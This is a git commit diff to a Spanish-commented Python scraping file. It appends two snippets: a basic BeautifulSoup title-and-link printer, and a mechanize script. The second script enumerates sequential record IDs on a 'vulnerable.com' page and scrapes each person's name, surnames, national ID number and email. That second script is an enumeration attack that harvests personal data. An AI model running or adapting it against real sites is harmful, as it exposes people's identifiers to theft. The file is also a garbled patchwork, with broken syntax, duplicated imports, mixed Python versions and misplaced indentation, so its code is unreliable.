f22e87e521d9c5d439024447d56e9b49d20415b7
Softterier <43970002+Softterier@users.noreply.github.com>
2022-02-02 15:26:11 -0500

    update Scrawling_pg.py

--- Scrawling_pg.py
+++ Scrawling_pg.py
@@ -12,6 +12,35 @@ Import Request
 Import Panda AS PandaData
 #Importar Libreria BeatifulSoap para  
 import BeautifulSoup
+from bs4 import BeautifulSoup
+import requests
+# Haciendo pruebas con BeautifulSoup y requests
+
+# Importamos las librerias
+from bs4 import BeautifulSoup
+import requests
+
+# Capturamos la url ingresada en la variable "url"
+url = raw_input("Ingrese la URL: ")
+
+# Capturamos el hml de la pagina web y creamos un objeto Response
+r  = requests.get("http://" +url)
+data = r.text
+print ""
+
+# Creamos el objeto soup y le pasamos lo capturado con request
+soup = BeautifulSoup(data, 'lxml')
+
+# Capturamos el titulo de la página y luego lo mostramos
+# Lo que hace BeautifulSoup es capturar lo que esta dentro de la etiqueta title de la url
+titulo = soup.title.text
+print "El titulo de la pagina es: " + titulo
+print ""
+
+# Buscamos todas etiquetas HTML (a) y luego imprimirmos todo lo que viene despues de "href"
+for link in soup.find_all('a'):
+    print(link.get('href'))
+    
 #URL Uniform Resource Locator 
 url = 
 #div#didomi-Host div  Aceptar Cookies
@@ -30,5 +59,77 @@ Equipos2 = list()
   for in equipos1: 
     Equipos2.append(i.text)
   Print (Equipos1)
+                         
+                         import mechanize
+import BeautifulSoup
+
+import time #Para controlar cuanto demora la ejecución del script
+import sys
+
+horaInicio= time.time()
+print 'Hora de inicio del script: ',time.ctime(horaInicio), '\n'
+
+#numeros_Comparendos= 
+
+# Numero de Dato inicial
+numeroInicial= 20000100
+
+# Numero de Dato final
+numeroFinal= 20000200
+
+# Se van obteniendo datos desde el Numero de Dato escogido hasta el final
+for numeroDato in xrange (numeroInicial,numeroFinal):
+	
+	try:
+		navegador= mechanize.Browser()
+
+		url= 'https://vulnerable.com/index.php?id='+str(numeroDato)+'&notif=mostrar'
+		#print 'probando la url: ',url
+
+		navegador.open(url)
+		
+		# Imprimir respuesta de la pagina web
+		
+		fuente= navegador.response().read()
+
+		#print fuente
+
+		# Pruebas para organizar los datos
+		webParseada= BeautifulSoup.BeautifulSoup(fuente)
+		# webParseada.findAll(attrs={"class" : "mensaje"})[0]
+
+		# Datos del usuario
+		#datos_usuario= webParseada.findAll(attrs={"class" : "mensaje"})[10]
+
+		nombre= webParseada.findAll(attrs={"class" : "mensaje"})[13].getText()
+
+		apellidos= webParseada.findAll(attrs={"class" : "mensaje"})[14].getText()
+
+		cedula= webParseada.findAll(attrs={"class" : "mensaje"})[12].getText()
+
+		correo= webParseada.findAll(attrs={"class" : "mensaje"})[17].getText()
+
+		print 'Numero de Dato: ', numeroDato
+
+		print 'Nombre: ', nombre
+
+		print 'Apellidos: ', apellidos
+
+		print 'Cedula: ', cedula
+
+		print 'Correo: ', correo
+
+		print '******************************************************************************************'
+
+	except: # Se atrapan todos los errores para que el programa no termine su ejecución al encontrar un usuario o contraseña incorrectos y se imprimen en pantalla
+		e = sys.exc_info()[1]
+		print 'Error detectado en la ejecucion del comparendo:',numeroDato , e
+
+horaFin= time.time()
+print 'Hora de inicio del script: ',time.ctime(horaInicio)
+print 'Hora de finalización del script: ',time.ctime(horaFin)
+
+tiempoEjecucion= horaFin-horaInicio
+print '\t La ejecución tomó %s segundos'%str(tiempoEjecucion)
   
                     
